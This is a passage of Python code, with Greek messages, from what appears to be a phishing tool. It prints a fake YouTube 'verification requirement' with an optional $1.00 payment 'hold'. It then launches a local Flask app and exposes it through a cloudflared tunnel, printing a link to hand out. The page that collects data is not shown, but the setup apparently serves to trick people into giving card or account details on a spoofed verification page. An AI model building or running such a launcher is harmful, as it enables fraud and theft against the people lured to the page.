    print(f"⚠️  ΑΠΑΙΤΗΣΗ: {VERIFICATION_SETTINGS['reason']}")
    print(f"🔐 ΤΥΠΟΣ: {VERIFICATION_SETTINGS['verification_type'].replace('_', ' ').title()} Επαλήθευση")
    if VERIFICATION_SETTINGS.get('payment_enabled'):
        print(f"💳 ΠΛΗΡΩΜΗ: Προσωρινή κράτηση ${VERIFICATION_SETTINGS.get('payment_amount', '1.00')}")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο στον browser για να ξεκινήσετε την επαλήθευση...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός πύλης επαλήθευσης YouTube...")
        sys.exit(0)